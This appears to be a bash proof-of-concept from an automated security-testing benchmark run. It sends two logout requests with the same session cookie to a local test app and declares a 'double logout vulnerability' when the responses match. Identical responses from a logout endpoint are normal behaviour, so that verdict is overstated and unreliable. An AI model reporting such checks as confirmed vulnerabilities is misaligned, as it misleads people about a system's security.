#!/bin/bash
# POC: Demonstrates double logout vulnerability where logout endpoint accepts multiple logout requests without session state validation
# Target: ./repo
# Created: 2025-11-04T17:46:00.682Z
# Session: benchmark-XBEN-027-24-mhku5fyk

# Double Logout Vulnerability - No Session State Validation POC
# This POC demonstrates that the logout endpoint does not validate session state
# and accepts multiple logout requests identically without error checking

TARGET="http://localhost:8080"
SESSION="test_fixed_session"

echo "=========================================="
echo "Double Logout Vulnerability POC"
echo "=========================================="
echo ""

# Test Case 1: First logout with session
echo "[*] Test Case 1: First logout request"
echo "Request: curl -s -i -X POST $TARGET/logout -H \"Cookie: session=$SESSION\""
echo ""

RESPONSE1=$(curl -s -i -X POST "$TARGET/logout" -H "Cookie: session=$SESSION")
STATUS1=$(echo "$RESPONSE1" | head -n 1)
LOCATION1=$(echo "$RESPONSE1" | grep -i "^Location:" | head -1)

echo "Response Status: $STATUS1"
echo "Response Headers:"
echo "$RESPONSE1" | head -n 20
echo ""

# Test Case 2: Second logout with SAME session immediately after
echo "[*] Test Case 2: Second logout request with SAME session"
echo "Request: curl -s -i -X POST $TARGET/logout -H \"Cookie: session=$SESSION\""
echo ""

RESPONSE2=$(curl -s -i -X POST "$TARGET/logout" -H "Cookie: session=$SESSION")
STATUS2=$(echo "$RESPONSE2" | head -n 1)
LOCATION2=$(echo "$RESPONSE2" | grep -i "^Location:" | head -1)

echo "Response Status: $STATUS2"
echo "Response Headers:"
echo "$RESPONSE2" | head -n 20
echo ""

# Analysis
echo "=========================================="
echo "Analysis:"
echo "=========================================="
echo ""

if [ "$STATUS1" = "$STATUS2" ]; then
    echo "✓ VULNERABILITY CONFIRMED:"
    echo "  - First logout:  $STATUS1"
    echo "  - Second logout: $STATUS2"
    echo ""
    echo "  Both requests returned IDENTICAL responses (same HTTP status)"
    echo "  No session state validation is performed"
    echo "  Endpoint accepts duplicate logout requests without error"
    echo ""
else
    echo "✗ Different responses:"
    echo "  - First logout:  $STATUS1"
    echo "  - Second logout: $STATUS2"
fi

if [ "$LOCATION1" = "$LOCATION2" ]; then
    echo "  - Location header is identical on both requests"
    echo "  - No indication of session already being logged out"
fi